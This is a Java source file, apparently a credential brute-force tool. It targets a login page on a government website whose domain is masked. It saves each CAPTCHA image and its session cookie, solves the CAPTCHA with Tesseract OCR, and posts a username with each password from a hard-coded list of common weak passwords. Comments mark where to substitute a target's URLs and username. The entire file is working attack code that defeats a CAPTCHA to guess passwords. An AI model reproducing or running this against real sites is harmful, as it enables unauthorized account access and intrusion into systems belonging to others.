package com.sunlands.hr.hanlp;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;



public class Test6 {
	public static void main(String[] args) throws IOException {
		String login_url = "http://www.xxxxx.gov.cn/webapp/zhihui/new_login.jsp";// 修改处
		String captcha_url = "http://www.xxxxx.gov.cn/webapp/zhihui/image.jsp";// 修改
		String username = "piaox";// 修改

		String[] password = { "admin", "password", "test123", "admin888", "1qaz2wsx", "wuyanni", "fuck001", "piaox",
				"4331018", "manage" }; // 修改
		for (int i = 0; i < password.length; i++) {
			String result = Captcha(captcha_url);
			String code = result.substring(0, result.indexOf("|"));
			String cookie = result.substring(result.indexOf("|") + 1);
			DoPost(login_url, username, password[i], code, cookie);
		}
	}

	/*
	 * 1、根据验证码url获取验证码，并保存在本地； 2、调用TestOcr识别图片，并转换成string； 3、保存访问图片，同时记录cookie；
	 * 4、返回给调用Captcha结果；
	 */
	public static String Captcha(String captcha_url) throws IOException {
		String code = "";
		URL url = new URL(captcha_url);
		URLConnection uc = url.openConnection();
		uc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0");
		InputStream is = uc.getInputStream();
		String cookie = uc.getHeaderField("Set-Cookie");
		if (cookie.indexOf(";") != -1) {
			cookie = cookie.substring(0, cookie.indexOf(";"));
		}
		File file = new File("d:/test.png");
		if (!file.exists()) {
			file.createNewFile();
		}
		FileOutputStream fos = new FileOutputStream("d:/test.png");
		byte[] buff = new byte[1024];
		int length;
		while ((length = is.read(buff)) != -1) {
			fos.write(buff, 0, length);
		}
		fos.close();
		is.close();
		try {
			Process p = Runtime.getRuntime().exec("tesseract.exe d:/test.png d:/test -l eng");
			p.waitFor();// waitfor()防止命令行执行未执行完就处理
			BufferedReader br = new BufferedReader(new FileReader("d:/test.txt"));
			String s;
			while ((s = br.readLine()) != null) {
				code += s;
			}
			br.close();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		String result = code + "|" + cookie;
		return result;
	}

	public static void DoPost(String login_url, String username, String password, String code, String cookie)
			throws IOException {
		URL url = new URL(login_url);
		HttpURLConnection hc = (HttpURLConnection) url.openConnection();// openConnection
		hc.setRequestMethod("POST");
		hc.setDoOutput(true);
		hc.setDoInput(true);
		hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0");
		hc.setRequestProperty("Cookie", cookie);
		OutputStreamWriter ops = new OutputStreamWriter(hc.getOutputStream(), "utf-8");
		ops.write("email=" + username + "&password=" + password + "&captcha=" + code);// post-body需要根据实际情况调整
		// ops.write("username="+username+"&userpass="+password+"&tvery="+code);
		ops.flush();
		ops.close();
		InputStream is = hc.getInputStream();
		System.out.println("email=" + username + "&password=" + password + "&captcha=" + code + " { "
				+ hc.getHeaderField(0) + "/" + is.available() + "}");
		hc.disconnect();
	}
}
